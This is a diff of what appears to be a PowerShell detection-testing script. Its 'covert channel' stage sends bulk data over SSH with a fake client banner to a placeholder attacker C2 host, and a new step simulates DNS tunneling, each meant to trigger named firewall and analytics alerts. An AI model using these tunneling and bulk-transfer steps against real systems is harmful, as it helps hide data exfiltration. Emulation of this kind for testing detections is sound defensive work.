@@ -17,4 +17,5 @@ Write-Stage "STAGE 3 (Covert channel): long high-volume SSH tunnel to $($cfg.Att
 # push a few hundred KB and hold the session open to look like a tunnel
 Invoke-SshConn -Server $cfg.AttackerC2 -Port $cfg.SshPort -ClientBanner "SSH-2.0-CovertOps_0.9" -SendKB 256 -HoldSeconds 3 -Label "tunnel bulk-1"
 Invoke-SshConn -Server $cfg.AttackerC2 -Port $cfg.SshPort -ClientBanner "SSH-2.0-CovertOps_0.9" -SendKB 384 -HoldSeconds 3 -Label "tunnel bulk-2"
-Write-Stage "STAGE 3 done. Expect EAL: 'Unusual SSH Activity' (rule f1545c54)." "OK"
+Invoke-TestDns -Category "dnstun"
+Write-Stage "STAGE 3 done. Expect FW NGFW: DNS-Security DNS-tunneling + (once baselined) EAL 'Unusual SSH Activity' f1545c54." "OK"
